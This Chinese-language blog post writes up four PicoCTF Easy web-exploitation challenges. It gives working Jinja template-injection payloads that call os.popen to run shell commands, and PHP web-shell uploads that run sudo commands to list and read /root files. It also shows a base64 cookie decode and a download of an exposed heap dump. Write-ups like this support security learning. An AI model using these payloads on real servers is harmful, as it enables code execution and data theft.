---
title: 'PicoCTF Web Exploitation Easy分級解題紀錄'
published: 2025-04-19
lastUpdated: '2025-04-20 04:00'
description: '紀錄 PicoCTF Web Exploitation Easy分級的解題過程與心得'
image: ''
tags: [PicoCTF, Web Exploitation, CTF, 網路安全]
category: '資安'
draft: false
lang: ''
---
# Introduction
這是拿來放一些解題ㄉ紀錄，慢慢邊做邊寫，因為我好久沒碰了
有些有有些沒有是因為有些我已經解過ㄌ，我也懶得再解一次


## SSTI1
### Description
SSTI (Server-Side Template Injection) 是一種網頁應用程式漏洞，當使用者輸入的資料被直接嵌入到伺服器端模板中時，就會發生這種漏洞。這可能導致攻擊者能夠執行任意的程式碼或命令，從而獲取敏感資訊或控制伺服器。  

### 解法
首先你會看到一個酷酷的網站，有一個輸入框，你會發現不論輸入啥他都會顯示在頁面上，我們可以試試看輸入```{{7*7}}```  會得到什麼
<img src="https://i.imgur.com/mbFg62p.png" width="300" height="200" />
沒錯!一個大大的49，這就是一個SSTI的漏洞，這個漏洞可以讓我們執行python的程式碼，接下來我們可以試試看```{{7*7*7*7}}``` 會得到什麼
![image](https://i.imgur.com/WgLYlaS.png)
這時我們已經確定這是一個SSTI的漏洞了，接下來我們可以來點更有趣的東西，他可以執行python的程式碼，因此應該可以執行一些系統命令
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```
![1745082641462](images/1745082641462.png)
這段程式碼大概的意思是
- ```request.application```: 訪問當前Web請求的應用

- ```__globals__```: 訪問全局命名空間，允許獲取內建函式

- ```__import__('os')```: 動態導入 os 模塊，這樣就可以使用操作系統相關功能

- ```popen('id')```: 執行系統命令 id，該命令顯示當前用戶的身份

- ```read()```: 讀取命令的輸出結果  
那我們可以把命令改成，ls來看看有沒有什麼驚喜，聽話讓我看看!
```python
{{request.application.__globals__.__builtins__.__import__('os').popen('ls').read()}}
```
![1745083019268](images/1745083019268.png)
最後只要試試看
```
python
{{request.application.__globals__.__builtins__.__import__('os').popen('cat flag').read()}}
```
我們就會得到flag了!  
picoCTF{||幹嘛，你要自己去試試看阿!還想偷看阿hhhhhhhhhhhhhhh||}  




## Cookie Monster Secret Recipe

### Description
Cookie ~~小餅乾~~ 是網站儲存在你瀏覽器中的小型資料，用來記住你的登入狀態、偏好設定或追蹤行為。下次你再訪問網站時，瀏覽器會自動帶上這些資訊，讓網站知道你是誰。
如果 Cookie 使用不當的話，可能會出現資安漏洞或使用者隱私外洩的風險。舉例來說：
  - 登入資訊可能被竊取：如果沒有設定 HttpOnly，攻擊者就有機會透過跨站腳本攻擊（XSS）偷走使用者的登入 Cookie，冒用身分。
  - 使用者操作被偽造：若網站沒有防範 CSRF 攻擊，攻擊者可以利用使用者的 Cookie 發出未經授權的操作，例如轉帳或修改帳號資料。
  - 敏感資料曝光：若在 Cookie 中儲存像是帳號、密碼、信用卡號等敏感資料，可能會被竊取或洩漏，造成重大安全問題。
  - 跨站追蹤問題：若使用第三方 Cookie，可能被廣告商用來追蹤使用者在不同網站的行為，侵犯個人隱私。
  - 資料被中途攔截：如果 Cookie 沒有設定 Secure，在未加密的 HTTP 傳輸過程中就可能被攔截。
因此，開發者在設計網站時必須謹慎使用 Cookie，避免成為資安漏洞的來源。

### 解法
首先我們看到網站，並且檢查F12->儲存空間->Cookies看看裡面有沒有東西，啥都沒有  
![cXhhshj.png](https://i.imgur.com/cXhhshj.png)
我們可以嘗試登入一下，帳號密碼隨意，哎呀看起來有問題
![image](https://i.imgur.com/xc9JLcK.png)
我們可以再看一次Cookies，看看有沒有東西
看起來有東西出現!
![image](https://i.imgur.com/41r84nI.png)
看起來長得有點像是base64編碼的東西，我們可以試試看丟到解碼的網站看看
得到答案啦!
![image](https://i.imgur.com/CuDY1CK.png)
- FLAG
  - ||picoCTF{自己去試試看啦hahahahahahahahha}||


## n0s4n1ty 1

### Description
這個網站有一個上傳檔案的功能，並且會顯示上傳的檔案名稱和路徑。  
有兩個需要注意的地方是未檢查的檔案上傳以及權限設定不當的問題。  
這可能會導致攻擊者能夠上傳惡意檔案，並且執行任意的程式碼或命令，從而獲取敏感資訊或控制伺服器。  

### 解法
首先我們看到網站可以上傳檔案，先上傳看看一個php檔案看看譨不能傳PNG以外的東西
提示中說要重點針對```sudo -l```，那我們就嘗試在php中執行看看
```php
<?php echo exec('sudo -l');?>
```
上傳之後顯示，讓我們去看看```uploads/owo.php```有甚麼東西
```
The file owo.php has been uploaded Path: uploads/owo.php 
```
![image](https://i.imgur.com/gFTXjB4.png)
既然可以執行指令那我們就可以嘗試看看root資料夾下面有沒有什麼驚喜
```php
<?php echo exec('sudo ls -al /root ');?>
```
再次訪問網站並且去到```uploads/owo.php```會顯示
```bash
-rw-r--r-- 1 root root 36 Mar 6 03:56 flag.txt
```
那我們可以喵喵一下把檔案內容顯示出來!
```php
<?php echo exec('sudo cat /root/flag.txt');?>
```
哎呀又找到ㄌ
- FLAG
  - picoCTF{||aaaaaaaaaaa自己去試試看啦||}

## head-dump

### Description
Heap dump（堆轉儲）是 Java 虛擬機（JVM）在特定時間點的內存快照，常用於診斷內存泄漏和性能問題。然而，若使用不當，可能帶來安全風險  
這個題目的面相會是需要注意獲得授權的人員才可以訪問head dump文件，這個文件包含了系統的內存轉儲，可能會洩漏敏感資訊或機密資料。
這可能會導致攻擊者能夠獲取敏感資訊或控制伺服器。

### 解法

首先我們進到網站會先看到這個頁面，題目描述中特別提到API Documentation的文章
![image](https://i.imgur.com/ODv3jxu.png)
我們會發現 #API Documentation 可以按下去，並且案下去會進入API的頁面
![image](https://i.imgur.com/UzVR81I.png)
最下方有一個```/headdump```點開來看看，並且我們可以嘗試戳戳看API嘗試之後會發現他吐了一個200回應給我們並且可以下載dump出來的檔案
![image](https://i.imgur.com/xmal43e.png)
接下來只要下載下來用記事本打開，但是有好多看不懂的東西怎辦，沒關係這時候只要使用尋找搜尋```picoCTF```就可以找到flag了!

- FLAG
  - picoCTF{||自己去試試看啦haskdlfjdisgsdmgzld||}

